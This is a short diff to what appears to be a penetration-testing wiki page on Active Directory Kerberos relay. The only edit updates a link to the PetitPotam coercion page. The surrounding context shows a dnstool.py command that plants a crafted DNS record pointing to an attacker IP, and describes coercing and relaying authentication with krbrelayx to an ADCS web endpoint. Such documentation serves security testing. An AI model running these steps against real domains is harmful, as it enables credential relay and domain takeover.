@@ -105,7 +105,7 @@ It is therefore necessary to restrict the content of the `CREDENTIAL_TARGET_INFO
 dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$ATTACKER_IP" --action add "$DC_IP" --tcp
 ```
 
-2. Then, trigger an authentication coerce (for example, with [PetitPotam](../mitm-and-coerced-authentications/ms-efsr.md)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):
+2. Then, trigger an authentication coerce (for example, with [PetitPotam](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):
 
 ```bash
 # In a first terminal, krbrelayx waiting for an authentication to relay
